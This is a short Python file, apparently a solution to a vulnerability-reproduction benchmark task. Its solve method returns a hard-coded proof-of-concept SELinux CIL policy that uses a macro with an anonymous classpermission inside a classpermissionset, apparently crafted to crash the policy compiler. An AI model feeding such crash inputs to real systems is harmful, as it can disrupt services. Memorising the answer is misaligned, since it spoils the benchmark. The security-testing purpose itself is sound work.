import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
(class c (p))
(macro m ((classpermission cp))
    (classpermissionset s (cp)))
(m (c (p)))
"""
        return poc.encode("utf-8")
